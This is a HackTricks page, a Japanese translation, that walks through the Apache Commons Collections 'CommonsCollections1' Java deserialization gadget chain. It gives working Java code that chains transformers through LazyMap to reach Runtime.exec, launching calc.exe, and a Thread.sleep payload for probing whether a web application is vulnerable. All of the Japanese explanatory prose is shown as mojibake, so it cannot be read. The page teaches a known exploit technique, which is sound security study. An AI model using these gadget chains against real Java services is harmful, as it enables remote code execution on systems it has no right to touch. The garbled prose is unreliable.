# CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Java Transformers to Rutime exec()

ã„ãã¤ã‹ã®å ´æ‰€ã§ã€æ¬¡ã®ã‚ˆã†ãªApacheã‚³ãƒ¢ãƒ³ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ãŸJavaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Javaã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã¤ã„ã¦ä½•ã‚‚çŸ¥ã‚‰ãªã„å ´åˆã€ã“ã®ã‚³ãƒ¼ãƒ‰ãŒã©ã®ã‚ˆã†ã«calcã‚’å®Ÿè¡Œã™ã‚‹ã‹ã‚’ç†è§£ã™ã‚‹ã®ã¯é›£ã—ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã¾ãšç¬¬ä¸€ã«ã€**Javaã®Transformer**ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚’å—ã‘å–ã‚Š**ã€**åˆ¥ã®ã‚¯ãƒ©ã‚¹ã«å¤‰æ›ã™ã‚‹**ã‚‚ã®ã§ã‚ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ã“ã“ã§**å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã¯**æ¬¡ã®ã‚‚ã®ã¨åŒç­‰**ã§ã‚ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ãŠãã¨èˆˆå‘³æ·±ã„ã§ã™:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
ã¾ãŸã¯**æ­£ç¢ºã«è¨€ã†ã¨**ã€æœ€å¾Œã«å®Ÿè¡Œã•ã‚Œã‚‹ã®ã¯æ¬¡ã®ã‚‚ã®ã§ã™ï¼š
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### ã©ã®ã‚ˆã†ã«

ã§ã¯ã€æœ€åˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒã€Œã‚·ãƒ³ãƒ—ãƒ«ã€ãªãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨åŒç­‰ã§ã‚ã‚‹ç†ç”±ã¯ä½•ã§ã™ã‹ï¼Ÿ

**ã¾ãš**ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã¯**å¤‰æ›ã®ãƒã‚§ãƒ¼ãƒ³ï¼ˆé…åˆ—ï¼‰ãŒä½œæˆã•ã‚Œã¦ã„ã‚‹**ã“ã¨ã«æ°—ã¥ãã“ã¨ãŒã§ãã¾ã™ï¼š
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€é…åˆ—ã®å¤‰æ›ã‚’ä½•ã‚‰ã‹ã®æ–¹æ³•ã§é€£é–ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã“ã¨ã«æ°—ä»˜ãã§ã—ã‚‡ã†ã€‚

ã§ã¯ã€**ãã‚Œã‚‰ã®å¤‰æ›ã¯ã©ã®ã‚ˆã†ã«é€£é–ã™ã‚‹ã®ã§ã™ã‹ï¼Ÿ**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æœ€å¾Œã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**Mapã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½œæˆã•ã‚Œã¾ã™**ã€‚æ¬¡ã«ã€`LazyMap`ã‹ã‚‰ãƒãƒƒãƒ—ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’ä½¿ã£ã¦é–¢æ•°`decorate`ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã€ã“ã‚Œã«ã‚ˆã‚Š**ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼**ãŒ`lazyMap.factory`å±æ€§å†…ã«ã‚³ãƒ”ãƒ¼ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™:
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ãã—ã¦ã€ç´ æ™´ã‚‰ã—ã„ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ãŒå®Ÿè¡Œã•ã‚Œã¾ã™: `lazyMap.get("anything");`

ã“ã‚Œã¯ `get` é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ãã—ã¦ã€ã“ã‚Œã¯ `transform` é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ã ã‹ã‚‰ã€**factory**ã®ä¸­ã«**`chainedTransformer`**ã‚’ä¿å­˜ã—ã¦ãŠã‚Šã€**`transform`**é–¢æ•°ã®ä¸­ã§**ã™ã¹ã¦ã®ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’é€šéã—ã¦**ã€1ã¤ãšã¤å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚é¢ç™½ã„ã“ã¨ã«ã€**å„ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã¯`object`**ã‚’**å…¥åŠ›**ã¨ã—ã¦ä½¿ç”¨ã—ã€**objectã¯æœ€å¾Œã«å®Ÿè¡Œã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‹ã‚‰ã®å‡ºåŠ›**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã™ã¹ã¦ã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒ ã¯æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒ¼ãƒ³å®Ÿè¡Œã—ã¦ã„ã¾ã™**ã€‚

### æ¦‚è¦

æœ€çµ‚çš„ã«ã€lazyMapãŒgetãƒ¡ã‚½ãƒƒãƒ‰å†…ã§ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’ç®¡ç†ã™ã‚‹æ–¹æ³•ã®ãŸã‚ã€ç§ãŸã¡ãŒä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã§ã™ï¼š
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_Note how `value` ã¯å„ transform ã®å…¥åŠ›ã§ã‚ã‚Šã€å‰ã® transform ã®å‡ºåŠ›ã§ã‚ã‚Šã€ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã®å®Ÿè¡Œã‚’å¯èƒ½ã«ã—ã¾ã™:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€ã“ã“ã§ã¯**ComonsCollections1**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ä½¿ç”¨ã•ã‚Œã‚‹**ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ãŒèª¬æ˜ã•ã‚Œã¾ã—ãŸã€‚ã—ã‹ã—ã€**ã“ã‚ŒãŒã©ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‹**ã¯æ®‹ã•ã‚Œã¦ã„ã¾ã™ã€‚ [ã“ã“ã§**ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)ã‚’ç¢ºèªã§ãã¾ã™ã€‚ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€`AnnotationInvocationHandler`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ãªãœãªã‚‰ã€**ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨**ã€`payload.get()`é–¢æ•°ã‚’**å‘¼ã³å‡ºã™**ã‹ã‚‰ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰å…¨ä½“ãŒå®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚

## Javaã‚¹ãƒ¬ãƒƒãƒ‰ã‚¹ãƒªãƒ¼ãƒ—

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€**ã‚¦ã‚§ãƒ–ãŒè„†å¼±ã‹ã©ã†ã‹ã‚’ç‰¹å®šã™ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚è„†å¼±ã§ã‚ã‚Œã°ã‚¹ãƒªãƒ¼ãƒ—ã‚’å®Ÿè¡Œã—ã¾ã™**ã€‚
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## More Gadgets

ã“ã“ã§ã•ã‚‰ã«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
